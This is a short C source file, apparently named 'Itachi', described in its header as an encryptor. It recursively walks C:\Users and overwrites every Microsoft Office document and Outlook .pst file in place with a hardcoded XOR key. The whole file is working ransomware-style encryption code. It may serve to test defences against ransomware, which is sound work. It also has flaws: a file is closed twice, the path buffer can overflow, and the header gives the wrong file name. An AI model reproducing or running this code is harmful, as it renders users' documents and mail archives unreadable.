/***************************************************************
*
* Itachi (c) 2022 by Mikhail Kondrashin (mkondrashin@gmail.com)
*
* main.go - encryptor - encrypt all MS Office files in C:\Users
* folder
*
***************************************************************/

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>

char unique[] = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX";

#define FOLDER "C:\\Users"
#define RECURSIVE 1

const char * targets[] = {
  ".doc",
  ".DOC",
  ".docx",
  ".DOCX",
  ".ppt",
  ".PPT",
  ".pptx",
  ".PPTX",
  ".xls",
  ".XLS",
  ".xlsx",
  ".XLSX",
  ".pst",
  ".PST",
  NULL
};

const char * secret = "secret password";

int encryptd(FILE * dskfileptr,
  const char * secret) {
  int i; //used to index through file buffer
  unsigned long int file_s; //holds number of bytes in file
  int keylen; //holds length of key
  char * filebuff = NULL;

  keylen = strlen(secret);

  fseek(dskfileptr, 0, SEEK_END);
  file_s = ftell(dskfileptr);

  printf("File size = %lu\n", file_s);
  // Here we can skip encrypting too logn files
  rewind(dskfileptr);

  filebuff = malloc(file_s);

  if (fread(filebuff, file_s, 1, dskfileptr) != 1) {
    printf("Error in reading file.\n");
    return -1;
  }

  for (i = 0; i < file_s; i++) //look through each byte of filebuff
  {
    filebuff[i] ^= secret[i % keylen];
  }

  rewind(dskfileptr); //move file pointer back to the beginning
  //of the file
  //write encrypted bytes (in filebuff) back to disk file
  if (fwrite(filebuff, file_s, 1, dskfileptr) != 1) {
    printf("Error in writing encrypted data to file.\n");
    system("pause");
    return -1;
  }

  free(filebuff); //returning RAM membory back to system
  fclose(dskfileptr);

  return 0;
}

int encrypt(const char * file_name,
  const char * secret) {
  FILE * fileptr = fopen(file_name, "r+");

  if (fileptr == NULL) {
    printf("Failed to open file.\n");
    return -1;
  }
  printf("Encrypt %s: Start\n", file_name);
  encryptd(fileptr, secret);
  printf("Encrypt %s: Done\n", file_name);
  fclose(fileptr);
  return 0;
}

/* when return 1, scandir will put this dirent to the list */
int parse_ext(const struct dirent * dir) {
  if (!dir)
    return 0;

  //if(dir->d_type == DT_REG) {
  const char * ext = strrchr(dir -> d_name, '.');
  if ((!ext) || (ext == dir -> d_name))
    return 0;
  else {
    for (int i = 0; targets[i]; i++)
      if (strcmp(ext, targets[i]) == 0)
        return 1;

  }
  //}
  return 0;
}

void encrypt_dir(const char * dir) {
  struct dirent * ep;
  DIR * dp = opendir(dir);
  if (dp != NULL) {
    while ((ep = readdir(dp))) {
      if (!strcmp(ep -> d_name, "."))
        continue;
      if (!strcmp(ep -> d_name, ".."))
        continue;
      char file_name[2000];
      file_name[0] = 0;
      // this is dangerous, I know
      strcpy(file_name, dir);
      strcat(file_name, "/");
      strcat(file_name, ep -> d_name);
      //puts(file_name);
#ifdef RECURSIVE
      encrypt_dir(file_name);
#endif
      printf("Try encrypt %s\n", file_name);
      if (!parse_ext(ep)) {
        printf("Skip\n");
        continue;
      }
      printf("Path: %s\n", file_name);
      encrypt(file_name, secret);
    }
    closedir(dp);
  }
}

int main(void) {
  encrypt_dir(FOLDER);
  return 0;
}